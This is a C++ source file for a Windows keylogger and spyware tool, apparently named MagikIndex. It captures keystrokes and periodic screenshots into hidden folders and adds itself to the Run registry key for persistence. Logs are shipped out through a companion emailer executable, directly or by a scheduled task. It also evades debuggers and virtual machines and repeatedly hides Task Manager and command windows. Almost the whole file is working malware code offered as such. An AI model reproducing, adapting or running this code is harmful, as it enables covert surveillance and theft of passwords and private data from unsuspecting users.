#define WIN32_LEAN_AND_MEAN

#define _CRT_SECURE_NO_WARNINGS
#include <atlbase.h>
#include <atlconv.h>
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>
#include <VersionHelpers.h>
#include <slpublic.h>
#include <tlhelp32.h>
#include <algorithm>
#include <iterator>
#include <memory>
#include <set>
#include <vector>
#include <comdef.h>
#include <comutil.h>
#include <Shldisp.h>
#include <shellapi.h>
#include <time.h>
#include <taskschd.h>
//#include <Wbemidl.h>
//#include <wbemcli.h>

#pragma warning( push )
#pragma warning( disable : 4477 )

typedef std::string String;
typedef std::vector<String> StringVector;
typedef unsigned long long uint64_t;

#define User ""
#define Password ""
#define MyServer ""

#define CharactersPerLog 300
#define MaximumFolderSize 10 
#define RequiredRam 2048 //MB
#define RequiredCores 2 
#define CryptPassword "MyPassword" 
#define BaseShiftValue 100 //base int to add to chars for crypting measures
#define SecondsBetweenScreenshots 20000


#define MAX_LENGTH 1024


#define WINDOWS_SLID                                                \
            { 0x55c92734,                                           \
              0xd682,                                               \
              0x4d71,                                               \
              { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f }    \
}


#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Slwga.lib")
#pragma comment( lib, "comsuppw.lib" )
//#pragma comment(lib, "Wbemuuid.lib.")

#define debug


FILE* OUTPUT_FILE;




extern "C" int RandomGenerator();


int SilentlyRemoveDirectory(const char* dir) // Fully qualified name of the directory being   deleted,   without trailing backslash
{
    int len = strlen(dir) + 2; // required to set 2 nulls at end of argument to SHFileOperation.
    char* tempdir = (char*)malloc(len);
    memset(tempdir, 0, len);
    strcpy(tempdir, dir);

    SHFILEOPSTRUCTA file_op = {
      NULL,
      FO_DELETE,
      tempdir,
      NULL,
      FOF_NOCONFIRMATION |
      FOF_NOERRORUI |
      FOF_SILENT,
      false,
      0,
      "" };
    int ret = SHFileOperationA(&file_op);
    free(tempdir);
    return ret; // returns 0 on success, non zero on failure.
}

BOOL WINAPI SaveBitmap(std::string wPath)
{
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);


    hFile = CreateFileA(wPath.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);

    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    return TRUE;
}


HRESULT SetUploadTask(std::string PathToEmailer, std::string LogToSend) {  //thank you Microsoft for not documenting shit and forcing me to dig every little bit on the internet just to make this
    CA2W PathToEmailerUnicode(PathToEmailer.c_str());
    CA2W LogToSendUnicode(LogToSend.c_str());
    CComPtr<ITaskService> service;
    service.CoCreateInstance(__uuidof(TaskScheduler));
    service->Connect(CComVariant(),CComVariant(),CComVariant(),CComVariant());
    CComPtr<ITaskFolder> folder;
    service->GetFolder(CComBSTR(L"\\"), &folder);
    CComPtr<ITaskFolder> newFolder;
    folder->CreateFolder(CComBSTR(L"MagikIndex"),CComVariant(), &newFolder);
    CComPtr<ITaskDefinition> definition;
    service->NewTask(0, &definition);
    CComPtr<IPrincipal> principal;
    definition->get_Principal(&principal);
    principal->put_RunLevel(TASK_RUNLEVEL_LUA);
    CComPtr<IActionCollection> actions;
    definition->get_Actions(&actions);
    CComPtr<IAction> action;
    actions->Create(TASK_ACTION_EXEC, &action);
    CComQIPtr<IExecAction> execAction(action);
    execAction->put_Path(CComBSTR(PathToEmailerUnicode));
    execAction->put_Arguments(CComBSTR(LogToSendUnicode));
    CComPtr<ITriggerCollection> triggers;
    definition->get_Triggers(&triggers);
    CComPtr<ITrigger> trigger;
    triggers->Create(TASK_TRIGGER_DAILY, &trigger);
    CComQIPtr<IDailyTrigger> weeklyTrigger(trigger);
    weeklyTrigger->put_StartBoundary(CComBSTR(L"2007-01-01T02:00:00-08:00"));
    weeklyTrigger->put_EndBoundary(CComBSTR(L"2035-05-02T12:05:00"));
    weeklyTrigger->put_DaysInterval((short)2);
    CComPtr<IRegisteredTask> registeredTask;
    folder->RegisterTaskDefinition(CComBSTR(L"Task"), definition, TASK_CREATE_OR_UPDATE, CComVariant(), CComVariant(), TASK_LOGON_INTERACTIVE_TOKEN, CComVariant(), &registeredTask);
}

std::set<DWORD> getAllThreadIds()
{
    auto processId = GetCurrentProcessId();
    auto currThreadId = GetCurrentThreadId();
    std::set<DWORD> thread_ids;
    std::unique_ptr< void, decltype(&CloseHandle) > h(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0), CloseHandle);
    if (h.get() != INVALID_HANDLE_VALUE)
    {
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        if (Thread32First(h.get(), &te))
        {
            do
            {
                if (te.dwSize >= (FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)))
                {
                    //only enumerate threads that are called by this process and not the main thread
                    if ((te.th32OwnerProcessID == processId) && (te.th32ThreadID != currThreadId))
                    {
                        thread_ids.insert(te.th32ThreadID);
                    }
                }
                te.dwSize = sizeof(te);
            } while (Thread32Next(h.get(), &te));
        }
    }
    return thread_ids;
}

template <class InputIterator>
HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest)
{
    _COM_SMARTPTR_TYPEDEF(IShellDispatch, IID_IShellDispatch);
    _COM_SMARTPTR_TYPEDEF(Folder, IID_Folder);
    IShellDispatchPtr shell;
    FolderPtr destFolder;

    variant_t dirName, fileName, options;

    HRESULT hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&shell);
    if (SUCCEEDED(hr))
    {
        dirName = dest;
        hr = shell->NameSpace(dirName, &destFolder);
        if (SUCCEEDED(hr))
        {
            auto existingThreadIds = getAllThreadIds();
            options = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI;  //NOTE:  same result as 0x0000
            while (first != last)
            {
                fileName = *first;
                printf("Copying %s to %s ...\n", *first, dest);
                ++first;
                hr = destFolder->CopyHere(fileName, options); //NOTE: this appears to always return S_OK even on error

                auto updatedThreadIds = getAllThreadIds();
                std::vector<decltype(updatedThreadIds)::value_type> newThreadIds;
                std::set_difference(updatedThreadIds.begin(), updatedThreadIds.end(), existingThreadIds.begin(), existingThreadIds.end(), std::back_inserter(newThreadIds));

                std::vector<HANDLE> threads;
                for (auto threadId : newThreadIds)
                    threads.push_back(OpenThread(SYNCHRONIZE, FALSE, threadId));

                if (!threads.empty())
                {
                    // Waiting for new threads to finish not more than 5 min.
                    WaitForMultipleObjects(threads.size(), &threads[0], TRUE, 5 * 60 * 1000);

                    for (size_t i = 0; i < threads.size(); i++)
                        CloseHandle(threads[i]);
                }
            }
        }
    }
    return hr;
}


ULONG WINAPI ScreenGrabber(LPVOID Parameter) {

    char* AppData = nullptr;
    char UserName[MAX_LENGTH + 1];
    DWORD Size = MAX_LENGTH + 1;
    GetUserNameA(UserName, &Size);
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
    std::string CurrentLog;
    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));
    //strcat_s(AppData, sizeof(AppData), "\\MagikGlass");
    std::string ScreenshotDir = AppData;
    ScreenshotDir += "\\MagikGlass";
    DWORD DWFlags;

    while (1) {
        CreateDirectoryA(ScreenshotDir.c_str(), NULL);
        SetFileAttributesA(ScreenshotDir.c_str(), FILE_ATTRIBUTE_HIDDEN);
        for (int i = 0; i < 20; i++) {
            CurrentLog = ScreenshotDir;
            CurrentLog += "\\ScreenShot";
            CurrentLog += std::to_string(rand() % 10000 - 1000);
            CurrentLog += ".bmp";

            SaveBitmap(CurrentLog);

            Sleep(SecondsBetweenScreenshots);
        }
        std::string ZipPath = ScreenshotDir;
        ZipPath += "\\Zip";
        ZipPath += std::to_string(rand() % 10000 - 1000);
        ZipPath += ".zip";

        FILE* f = fopen(ZipPath.c_str(), "wb");
        fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
        fclose(f);

        const char* files[] = {
            ScreenshotDir.c_str()
        };

        {
            CoInitialize(NULL);
            CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
            CoUninitialize();
        }

        std::string Emailer = "C:\\Users\\";
        Emailer += UserName;
        Emailer += "\\Music\\MagikIndex";
        Emailer += "\\emailer.exe ";

        if (!InternetGetConnectedState(&DWFlags, NULL)) {
            SetUploadTask(Emailer, ZipPath);
        }
        else {
            Emailer += ZipPath;
            system(Emailer.c_str());
        }

        Sleep(60000);

        SilentlyRemoveDirectory(ScreenshotDir.c_str());

    }
}


int ExtrapolateKey() {

    std::string Passwd = CryptPassword;
    int ExtrapolatedKey = BaseShiftValue;
    for (int plq = 0; plq < Passwd.size(); plq++) {
        ExtrapolatedKey += (int)Passwd[plq];
    }
    return ExtrapolatedKey;
}


int CalculateDirSize(std::string DirectoryToCheck) {

    HANDLE hFind;
    WIN32_FIND_DATAA data;

    DirectoryToCheck += "\\*.*";

    int FileCounter = 0;

    //char FilePath[MAX_PATH + 1];
    DWORD FileSize = MAX_PATH + 1;

    hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
            FileCounter++;
            //}
        } while (FindNextFileA(hFind, &data));
        FindClose(hFind);
    }

    return FileCounter;
}


BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};


    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");

    if (args != NULL)
    {
        strcat_s(szValue, args);
    }

    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

std::string EncryptMyString(std::string UnencryptedString) {
#ifndef debug
    std::string CryptedString;
    for (int r = 0; r < UnencryptedString.size(); r++) {
        CryptedString += UnencryptedString[r] + ExtrapolateKey();
    }
    UnencryptedString = CryptedString;
#endif
    return UnencryptedString;
}

void LogItInt(int key_stroke,std::string FileName) {
    if (key_stroke == 1 || key_stroke == 2) 
        return;
    if (key_stroke == VK_MBUTTON || key_stroke == VK_XBUTTON1 || key_stroke == VK_XBUTTON2 || key_stroke == 7)
        return;

    fopen_s(&OUTPUT_FILE,FileName.c_str(), "a+");

    std::cout << key_stroke << std::endl;

    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("\n"));
    else if (key_stroke == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString(" "));
    else if (key_stroke == VK_LWIN)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[WIN]"));
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[TAB]"));
    else if (key_stroke == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]")); //later check for clipboard
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[END]"));
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[HOME]"));
    else if (key_stroke == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DELETE]"));
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[LEFT]"));
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[UP]"));
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
    else
#ifndef debug
        key_stroke += ExtrapolateKey();
#endif
        fprintf(OUTPUT_FILE, "%s", &key_stroke);
    fclose(OUTPUT_FILE);
}

/*
void FileSubmit(const char* localfile, const char* remotefile)
{
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        std::cout << "Error: " << GetLastError();

    }
    else
    {
        hFtpSession = InternetConnectA(hInternet, MyServer, INTERNET_DEFAULT_FTP_PORT, User, Password, INTERNET_SERVICE_FTP, 0, 0);
        if (hFtpSession == NULL)
        {
            std::cout << "Error ftp: " << GetLastError();
        }
        else
        {

            if (FtpPutFileA(hFtpSession, localfile, remotefile, FTP_TRANSFER_TYPE_BINARY, 0)){}
        }
    }
}
*/

void LogItChar(std::string Value, std::string FileName) {
#ifndef debug
    if (IsDebuggerPresent()) {
        exit(0);
    }

#endif

    Value += "\n";

    std::ofstream File;
    File.open(FileName, std::ios_base::app);
    File << EncryptMyString(Value);
    File.close();
}


ULONG WINAPI Protect(LPVOID);


ULONG WINAPI Protect(LPVOID Parameter) {

    if (IsDebuggerPresent()){
        exit(0);
    }
    while (1) {

        HWND Prog;
        Prog = FindWindowA(NULL, "Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Windows Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Command Prompt");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "C:\\Windows\\System32\\cmd.exe");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Run");
        ShowWindow(Prog, 0);
        Sleep(200);
    }
    return 0;
}


int main()
{

    FreeConsole();

    CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }

    DWORD Tick1 = GetTickCount();

    int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();

    srand(RandSeed);

    bool PatchedMe = false;

#ifndef debug

    int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;

    for (int j = 0; j <= Divider; j++) {
        Sleep(DividedSleep);
    }

    DWORD PatchCheck = GetTickCount();
    
    if ((int)(PatchCheck - Tick1) < Time - 5000) {
        PatchedMe = true;
    }


    unsigned long ThreadId;
    CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);

#endif

    bool FirstLog = true;

    unsigned long ThreadId2;
    CreateThread(NULL, 0, ScreenGrabber, 0, 0, &ThreadId2);

Log:

    DWORD Tick = GetTickCount();

    std::string TimeText = "Current Tick:";
    std::string ComputerText = "Host Name:";
    std::string UsernameText = "User Name:";
    std::string InternetText = "Internet Status:";
    std::string WidthText = "Screen Width:";
    std::string HeightText = "Screen Height:";
    std::string AspectRatioText = "Aspect Ratio:";
    std::string WindowsText = "Windows Version:";
    std::string OEMText = "OEM Number:";
    std::string CPUNumberText = "Number Of Cores:";
    std::string CPUTypeText = "CPU Type:";
    std::string GenuineText = "Genuine Windows:";
    std::string SlowText = "Low-End CPU:";
    std::string MouseText = "Number Of Mouse Buttons:";
    std::string MonitorText = "Number Of Monitors:";
    std::string MiddleEastText = "Middle-East PC:";
    std::string BootText = "Normal Boot:";
    std::string RAMText = "RAM Size:";
    std::string SeedText = "Randomness Seed:";
    std::string CopiedFileText = "Made executable \"";
    std::string CryptText = "Encrypted with \"";

    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");

    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));

    std::string LogTime = std::to_string(Tick);

    std::string CurrentLog = AppData;
    CurrentLog += "\\MagikIndex";

    CreateDirectoryA(CurrentLog.c_str(),NULL);

    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);

    CurrentLog += "\\Log";
    CurrentLog += LogTime;
    CurrentLog += ".txt";

    SYSTEMTIME SysTime;
    char TimeBuffer[512];
    ZeroMemory(&TimeBuffer, sizeof(TimeBuffer));
    GetLocalTime(&SysTime);

    std::string StartDate = "_________";
    StartDate += std::to_string(SysTime.wDay);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wMonth);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wYear);
    StartDate += "  ";
    StartDate += std::to_string(SysTime.wHour);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wMinute);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wSecond);
    StartDate += "_________\n";

    LogItChar(StartDate, CurrentLog);

#ifdef debug

    LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#", CurrentLog);
    LogItChar("Not crypting the logs...", CurrentLog);

#else

    LogItChar("Started in normal mode...", CurrentLog);
    CryptText += std::to_string(ExtrapolateKey());
    CryptText += "\" Key Shift...";
    LogItChar(CryptText, CurrentLog);

#endif

    if (PatchedMe) {
        LogItChar("I was patched! Exiting... ;(",CurrentLog);
        exit(1);
    }


    DWORD Size = MAX_LENGTH+1;

    char HostName[MAX_LENGTH+1];

    char UserName[MAX_LENGTH+1];

    std::string InternetStatusString = "Not connected, error: ";

    DWORD DWFlags;

    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) { //switch between these two ways to check as you see fit, or even use both
    if (InternetGetConnectedState(&DWFlags,NULL)){
        InternetStatusString = "Connected";
    }else{
        InternetStatusString += std::to_string(GetLastError());
        InternetStatusString += ", returned flags: ";
        InternetStatusString += std::to_string(DWFlags);
    }

    GetComputerNameA(HostName,&Size);

    GetUserNameA(UserName,&Size);

    if (FirstLog) {

        LogItChar("First log of the session, copying files and adding to startup...", CurrentLog);

        std::string DestinationFile = "C:\\Users\\";
        DestinationFile += UserName;
        DestinationFile += "\\Music\\MagikIndex";


        CreateDirectoryA(DestinationFile.c_str(), NULL);

        SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);

        if (CalculateDirSize(DestinationFile) > MaximumFolderSize) {
            std::string Command = "/C del /f /q ";
            Command += DestinationFile;
            Command += "\\*.*";
            ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
            LogItChar("Cleaned MagikIndex folder...", CurrentLog);
            Sleep(200);
        }

        std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");
        std::string EmailerPath = std::string(PathToFile).substr(0, pos);
        EmailerPath += "\\emailer.exe";
        std::string EmailerDestination = DestinationFile;
        EmailerDestination += "\\emailer.exe";
        CopyFileA(EmailerPath.c_str(), EmailerDestination.c_str(), false);
        LogItChar("Copied emailer.exe...", CurrentLog);
        DestinationFile += "\\";

        std::string CopiedFile;

        char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
        for (int i = 0; i < 15; i++) {
            CopiedFile += CharacterSet[rand() % 61 + 0];
        }

        DestinationFile += CopiedFile;

        DestinationFile += ".exe";

        CopyFileA(PathToFile, DestinationFile.c_str(), false);

        CopiedFileText += CopiedFile;
        CopiedFileText += ".exe\"...";
        LogItChar(CopiedFileText, CurrentLog);

        RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");

        LogItChar("Registered executable for startup...", CurrentLog);

    }else{
        LogItChar("Not the first log of the session, skip copying files...", CurrentLog);
    }

    int x1, y1, x2, y2, w, h, mo, mb;

    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    mo = GetSystemMetrics(SM_CMONITORS);
    mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
    w = x2 - x1;
    h = y2 - y1;

   
    double Ratios[6] = {4/3,16/9,21/9,32/9,16/10,5/4}; //check for monitor ratio (got this idea once i noticed heigth on my host and guest dont match, so if started in a not fullscreen VM the aspect ratio will be off)
    double Ratioed = (double)w / h;
    bool RatioMatch = false;
    for (int q = 0; q < 6; q++) {
        if (Ratioed == Ratios[q]) {
            RatioMatch = true;
        }
    }
#ifndef debug
    if (!RatioMatch) {
        LogItChar("Aspect ratio doesn't match the list: probably a VM... exiting....",CurrentLog);
        exit(1);
    }
#endif
    std::string Width = std::to_string(w);

    std::string Height = std::to_string(h);

    std::string WindowsVersion = "Unknown";

    std::string Monitors = std::to_string(mo);
    
    std::string MouseButtons = std::to_string(mb);

    std::string BootMode = "Yes";

    if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
        BootMode = "No";
    }

    std::string SlowMachine = "No";

    if (GetSystemMetrics(SM_SLOWMACHINE) != 0) {
        SlowMachine = "Yes";
    }

    std::string MiddleEast = "No";
    if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
        MiddleEast = "Yes";
    }

    if (IsWindows7OrGreater())
    {
        std::string WindowsVersion = "Seven";
    }

    if (IsWindows7SP1OrGreater())
    {
        std::string WindowsVersion = "Seven SP1";
    }

    if (IsWindows8OrGreater())
    {
        std::string WindowsVersion = "Eight";
    }

    if (IsWindows8Point1OrGreater())
    {
        std::string WindowsVersion = "Eight.one";
    }

    if (IsWindows10OrGreater())
    {
        std::string WindowsVersion = "Ten";
    }

    if (IsWindowsServer())
    {
        std::string WindowsVersion = "Server";
    }


    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);

    MEMORYSTATUSEX RAMStatus;
    RAMStatus.dwLength = sizeof(RAMStatus);
    GlobalMemoryStatusEx(&RAMStatus);

#ifndef debug
    if (siSysInfo.dwNumberOfProcessors < RequiredCores || (RAMStatus.ullTotalPhys / 1024) / 1024 < RequiredRam) {
        LogItChar("PC Specs dont match the requirements: probably a VM... exiting....", CurrentLog);
        exit(1);
    }
#endif

    std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
    std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
    std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
    std::string RAMAmount = std::to_string((RAMStatus.ullTotalPhys / 1024) / 1024);
    
    std::string IsGenuine = "Yes";
    CONST SLID AppId = WINDOWS_SLID;
    SL_GENUINE_STATE GenuineState;
    HRESULT hResult;

    hResult = SLIsGenuineLocal(&AppId, &GenuineState, NULL);

    if (hResult == S_OK) {
        if (GenuineState != SL_GEN_STATE_IS_GENUINE) {
            IsGenuine = "No";
        }
    }


    TimeText += LogTime;
    LogItChar(TimeText, CurrentLog);

    ComputerText += HostName;
    LogItChar(ComputerText, CurrentLog);

    UsernameText += UserName;
    LogItChar(UsernameText, CurrentLog);

    InternetText += InternetStatusString;
    LogItChar(InternetText, CurrentLog);

    WidthText += Width;
    LogItChar(WidthText, CurrentLog);

    HeightText += Height;
    LogItChar(HeightText, CurrentLog);

    AspectRatioText += std::to_string(Ratioed);
    LogItChar(AspectRatioText,CurrentLog);

    WindowsText += WindowsVersion;
    LogItChar(WindowsText, CurrentLog);

    OEMText += OEMNumber;
    LogItChar(OEMText,CurrentLog);

    RAMText += RAMAmount;
    RAMText += " MB";
    LogItChar(RAMText,CurrentLog);

    CPUNumberText += CPUCores;
    LogItChar(CPUNumberText, CurrentLog);

    CPUTypeText += CPUType;
    LogItChar(CPUTypeText, CurrentLog);

    GenuineText += IsGenuine;
    LogItChar(GenuineText, CurrentLog);

    MouseText += MouseButtons;
    LogItChar(MouseText, CurrentLog);

    MonitorText += Monitors;
    LogItChar(MonitorText, CurrentLog);

    BootText += BootMode;
    LogItChar(BootText, CurrentLog);

    SlowText += SlowMachine;
    LogItChar(SlowText, CurrentLog);

    MiddleEastText += MiddleEast;
    LogItChar(MiddleEastText, CurrentLog);

    SeedText += std::to_string(RandSeed);
    LogItChar(SeedText, CurrentLog);


    LogItChar("_____________________________________________\n",CurrentLog);

    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);




    int ArraySize = 10;

     int KeyList = {};


     for (int k = 0; k < CharactersPerLog;) {
         Sleep(25);
         for (int i = 8; i < 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
                 LogItInt(i, CurrentLog);
                 k++;
             }
         }
     }
     /*
     std::string RemoteFile = "Log";
     RemoteFile += LogTime;
     RemoteFile += ".txt";
     FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
     */

     LogItChar("\n_____________________________________________", CurrentLog);
     LogItChar("Character limit hit, sending log...",CurrentLog);

     std::string Emailer = "C:\\Users\\";
     Emailer += UserName;
     Emailer += "\\Music\\MagikIndex";
     Emailer += "\\emailer.exe ";

     if (!InternetGetConnectedState(&DWFlags, NULL)) {
         LogItChar("No Internet, scheduling task for log extraction...",CurrentLog);
         SetUploadTask(Emailer,CurrentLog);
     }else{
         Emailer += CurrentLog;
         system(Emailer.c_str());
     }
     FirstLog = false;

     goto Log;
     return 0;
}

#pragma warning( pop )